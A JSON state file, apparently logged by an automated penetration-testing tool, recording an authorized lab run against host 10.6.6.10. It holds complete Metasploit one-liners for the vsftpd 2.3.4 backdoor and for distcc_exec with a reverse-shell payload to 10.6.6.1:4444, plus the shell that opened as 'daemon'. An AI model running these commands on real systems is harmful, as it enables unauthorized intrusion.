@@ -1,0 +1,429 @@
+{
+  "schema_version": "2.0",
+  "session": {
+    "id": "20260611_152813_mvp_session",
+    "name": null,
+    "mode": null,
+    "created_at": null,
+    "status": "created"
+  },
+  "scope": {
+    "target_type": "host",
+    "target": "10.6.6.10",
+    "goal": "obtain_session",
+    "authorized": true,
+    "allow_exploitation": true,
+    "allow_pivoting": false,
+    "max_steps": null
+  },
+  "attacker": {
+    "hostname": null,
+    "interfaces": [],
+    "ipv4": [],
+    "default_gw": [],
+    "arp_neighbors": [],
+    "routes": [],
+    "lhost": null
+  },
+  "target": {
+    "networks": {
+      "net:10.6.6.10/24": {
+        "id": "net:10.6.6.10/24",
+        "cidr": "10.6.6.10/24",
+        "in_scope": true,
+        "reachable": null,
+        "discovered": false,
+        "host_discovery_done": false,
+        "port_scan_done": false,
+        "host_ids": [
+          "host:10.6.6.10"
+        ],
+        "evidence_ids": []
+      }
+    },
+    "hosts": {
+      "host:10.6.6.10": {
+        "id": "host:10.6.6.10",
+        "ip": "10.6.6.10",
+        "network_id": "net:10.6.6.10/24",
+        "in_scope": true,
+        "alive": null,
+        "hostnames": [],
+        "os": null,
+        "port_ids": [
+          "port:10.6.6.10:tcp:21",
+          "port:10.6.6.10:tcp:3632"
+        ],
+        "service_ids": [
+          "svc:10.6.6.10:tcp:21",
+          "svc:10.6.6.10:tcp:3632"
+        ],
+        "credential_ids": [],
+        "vulnerability_ids": [],
+        "session_ids": [
+          "sess:1"
+        ],
+        "finding_ids": [
+          "finding:session_opened_via_distcc_exec:10.6.6.10:3632"
+        ],
+        "evidence_ids": [
+          "evd:0002:session:sess_1"
+        ],
+        "attempt_ids": [
+          "attempt:0001:601",
+          "attempt:0002:602"
+        ]
+      }
+    },
+    "ports": {
+      "port:10.6.6.10:tcp:21": {
+        "id": "port:10.6.6.10:tcp:21",
+        "host_id": "host:10.6.6.10",
+        "ip": "10.6.6.10",
+        "port": 21,
+        "protocol": "tcp",
+        "state": "open",
+        "service_id": "svc:10.6.6.10:tcp:21",
+        "evidence_ids": [],
+        "attempt_ids": []
+      },
+      "port:10.6.6.10:tcp:3632": {
+        "id": "port:10.6.6.10:tcp:3632",
+        "host_id": "host:10.6.6.10",
+        "ip": "10.6.6.10",
+        "port": 3632,
+        "protocol": "tcp",
+        "state": "open",
+        "service_id": "svc:10.6.6.10:tcp:3632",
+        "evidence_ids": [],
+        "attempt_ids": []
+      }
+    },
+    "services": {
+      "svc:10.6.6.10:tcp:21": {
+        "id": "svc:10.6.6.10:tcp:21",
+        "host_id": "host:10.6.6.10",
+        "port_id": "port:10.6.6.10:tcp:21",
+        "ip": "10.6.6.10",
+        "port": 21,
+        "protocol": "tcp",
+        "name": null,
+        "family": null,
+        "product": null,
+        "version": null,
+        "banner": null,
+        "technology": [],
+        "enumerated": false,
+        "vuln_checked": false,
+        "credential_ids": [],
+        "vulnerability_ids": [],
+        "session_ids": [],
+        "finding_ids": [],
+        "evidence_ids": [],
+        "attempt_ids": [
+          "attempt:0001:601"
+        ]
+      },
+      "svc:10.6.6.10:tcp:3632": {
+        "id": "svc:10.6.6.10:tcp:3632",
+        "host_id": "host:10.6.6.10",
+        "port_id": "port:10.6.6.10:tcp:3632",
+        "ip": "10.6.6.10",
+        "port": 3632,
+        "protocol": "tcp",
+        "name": null,
+        "family": null,
+        "product": null,
+        "version": null,
+        "banner": null,
+        "technology": [],
+        "enumerated": false,
+        "vuln_checked": false,
+        "credential_ids": [],
+        "vulnerability_ids": [],
+        "session_ids": [
+          "sess:1"
+        ],
+        "finding_ids": [
+          "finding:session_opened_via_distcc_exec:10.6.6.10:3632"
+        ],
+        "evidence_ids": [
+          "evd:0002:session:sess_1"
+        ],
+        "attempt_ids": [
+          "attempt:0002:602"
+        ]
+      }
+    }
+  },
+  "vulnerabilities": {},
+  "credentials": {},
+  "sessions": {
+    "sess:1": {
+      "id": "sess:1",
+      "type": "shell",
+      "status": "closed",
+      "host_id": "host:10.6.6.10",
+      "service_id": "svc:10.6.6.10:tcp:3632",
+      "vulnerability_id": "vuln:distcc_exec:10.6.6.10:tcp:3632",
+      "credential_id": null,
+      "attempt_id": "attempt:0002:602",
+      "host": "10.6.6.10",
+      "port": 3632,
+      "protocol": "tcp",
+      "service": "distcc",
+      "tool": "msfconsole",
+      "user": "daemon",
+      "privilege": "daemon",
+      "hostname": null,
+      "system": null,
+      "opened_at_step": 2,
+      "closed_at_step": 2,
+      "evidence_ids": [
+        "evd:0002:session:sess_1"
+      ],
+      "finding_ids": [
+        "finding:session_opened_via_distcc_exec:10.6.6.10:3632"
+      ],
+      "external_id": "1"
+    }
+  },
+  "attempts": {
+    "attempt:0001:601": {
+      "id": "attempt:0001:601",
+      "step_idx": 1,
+      "action_id": 601,
+      "action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+      "phase": "exploit",
+      "target_id": "svc:10.6.6.10:tcp:21",
+      "host_id": "host:10.6.6.10",
+      "service_id": "svc:10.6.6.10:tcp:21",
+      "vulnerability_id": "vuln:vsftpd_234_backdoor:10.6.6.10:tcp:21",
+      "credential_id": null,
+      "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "success": null,
+      "event_types": [
+        "EXPLOIT_ATTEMPTED"
+      ],
+      "evidence_ids": []
+    },
+    "attempt:0002:602": {
+      "id": "attempt:0002:602",
+      "step_idx": 2,
+      "action_id": 602,
+      "action_name": "MSF_EXPLOIT_DISTCC_EXEC",
+      "phase": "exploit",
+      "target_id": "svc:10.6.6.10:tcp:3632",
+      "host_id": "host:10.6.6.10",
+      "service_id": "svc:10.6.6.10:tcp:3632",
+      "vulnerability_id": "vuln:distcc_exec:10.6.6.10:tcp:3632",
+      "credential_id": null,
+      "command": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 10.6.6.10; set RPORT 3632; set payload cmd/unix/reverse; set LHOST 10.6.6.1; set LPORT 4444; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "success": true,
+      "event_types": [
+        "EXPLOIT_ATTEMPTED",
+        "SESSION_OPENED"
+      ],
+      "evidence_ids": []
+    }
+  },
+  "evidence": {
+    "evd:0002:session:sess_1": {
+      "id": "evd:0002:session:sess_1",
+      "step_idx": 2,
+      "kind": "session",
+      "title": "Session opened",
+      "summary": null,
+      "host_id": "host:10.6.6.10",
+      "service_id": "svc:10.6.6.10:tcp:3632",
+      "attempt_id": "attempt:0002:602",
+      "event_ref": null,
+      "command_ref": null
+    }
+  },
+  "findings": {
+    "finding:session_opened_via_distcc_exec:10.6.6.10:3632": {
+      "id": "finding:session_opened_via_distcc_exec:10.6.6.10:3632",
+      "title": "Session opened via distcc_exec",
+      "type": "session",
+      "status": "confirmed",
+      "severity": "critical",
+      "host_ids": [
+        "host:10.6.6.10"
+      ],
+      "service_ids": [
+        "svc:10.6.6.10:tcp:3632"
+      ],
+      "vulnerability_ids": [
+        "vuln:distcc_exec:10.6.6.10:tcp:3632"
+      ],
+      "credential_ids": [],
+      "session_ids": [
+        "sess:1"
+      ],
+      "evidence_ids": [
+        "evd:0002:session:sess_1"
+      ],
+      "source": "msfconsole",
+      "service": null,
+      "description": null,
+      "recommendation": null
+    }
+  },
+  "coverage": {
+    "networks_discovered": [],
+    "networks_scanned": [],
+    "hosts_discovered": [
+      "host:10.6.6.10"
+    ],
+    "hosts_port_scanned": [],
+    "hosts_service_scanned": [],
+    "services_enumerated": [],
+    "services_checked_for_vulns": [],
+    "vulns_attempted": [],
+    "credentials_tested": [],
+    "exploits_attempted": [
+      "attempt:0001:601",
+      "attempt:0002:602"
+    ],
+    "sessions_validated": [
+      "sess:1"
+    ]
+  },
+  "history": [
+    {
+      "type": "EXPLOIT_ATTEMPTED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "service": "ftp",
+      "exploit": "vsftpd_234_backdoor",
+      "source": "msfconsole",
+      "step_idx": 1,
+      "t": 0,
+      "action_id": 601,
+      "action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+      "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "target_id": null,
+      "host_id": null,
+      "port_id": null,
+      "service_id": null,
+      "vulnerability_id": null,
+      "credential_id": null,
+      "session_id": null
+    },
+    {
+      "type": "EXPLOIT_ATTEMPTED",
+      "host": "10.6.6.10",
+      "port": 3632,
+      "service": "distcc",
+      "exploit": "distcc_exec",
+      "source": "msfconsole",
+      "step_idx": 2,
+      "t": 1,
+      "action_id": 602,
+      "action_name": "MSF_EXPLOIT_DISTCC_EXEC",
+      "command": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 10.6.6.10; set RPORT 3632; set payload cmd/unix/reverse; set LHOST 10.6.6.1; set LPORT 4444; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "target_id": null,
+      "host_id": null,
+      "port_id": null,
+      "service_id": null,
+      "vulnerability_id": null,
+      "credential_id": null,
+      "session_id": null
+    },
+    {
+      "type": "SESSION_OPENED",
+      "host": "10.6.6.10",
+      "port": 3632,
+      "service": "distcc",
+      "session_id": "1",
+      "session_type": "shell",
+      "exploit": "distcc_exec",
+      "source": "msfconsole",
+      "user": "daemon",
+      "privilege": "daemon",
+      "hostname": "s02-meta-full",
+      "system": "Linux s02-meta-full 6.18.9+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.9-1kali1 (2026-02-10) x86_64 GNU/Linux",
+      "evidence": {
+        "uid_line": "uid=1(daemon) gid=1(daemon)"
+      },
+      "step_idx": 2,
+      "t": 1,
+      "action_id": 602,
+      "action_name": "MSF_EXPLOIT_DISTCC_EXEC",
+      "command": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 10.6.6.10; set RPORT 3632; set payload cmd/unix/reverse; set LHOST 10.6.6.1; set LPORT 4444; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "target_id": null,
+      "host_id": null,
+      "port_id": null,
+      "service_id": null,
+      "vulnerability_id": null,
+      "credential_id": null
+    },
+    {
+      "type": "SESSION_CLOSED",
+      "host": "10.6.6.10",
+      "port": 3632,
+      "service": "distcc",
+      "session_id": "1",
+      "source": "msfconsole",
+      "step_idx": 2,
+      "t": 1,
+      "action_id": 602,
+      "action_name": "MSF_EXPLOIT_DISTCC_EXEC",
+      "command": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 10.6.6.10; set RPORT 3632; set payload cmd/unix/reverse; set LHOST 10.6.6.1; set LPORT 4444; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "target_id": null,
+      "host_id": null,
+      "port_id": null,
+      "service_id": null,
+      "vulnerability_id": null,
+      "credential_id": null
+    }
+  ],
+  "steps": [],
+  "last": {
+    "step_idx": 2,
+    "action_id": 602,
+    "action_name": "MSF_EXPLOIT_DISTCC_EXEC",
+    "rc": 0,
+    "success": null,
+    "event_types": [
+      "EXPLOIT_ATTEMPTED",
+      "SESSION_OPENED",
+      "SESSION_CLOSED"
+    ],
+    "progress": null
+  },
+  "focus": {
+    "level": "session",
+    "network_id": null,
+    "host_id": "host:10.6.6.10",
+    "port_id": null,
+    "service_id": "svc:10.6.6.10:tcp:3632",
+    "vulnerability_id": "vuln:distcc_exec:10.6.6.10:tcp:3632",
+    "credential_id": null,
+    "session_id": "sess:1",
+    "reason": "pending_service_on_target_host"
+  },
+  "stats": {
+    "steps": 0,
+    "commands": 0,
+    "networks": 1,
+    "hosts": 1,
+    "ports": 2,
+    "services": 2,
+    "vulns": 0,
+    "credentials": 0,
+    "sessions": 1,
+    "attempts": 2,
+    "evidence": 1,
+    "findings": 1,
+    "exploits_attempted": 2,
+    "exploits_failed": 0
+  }
+}
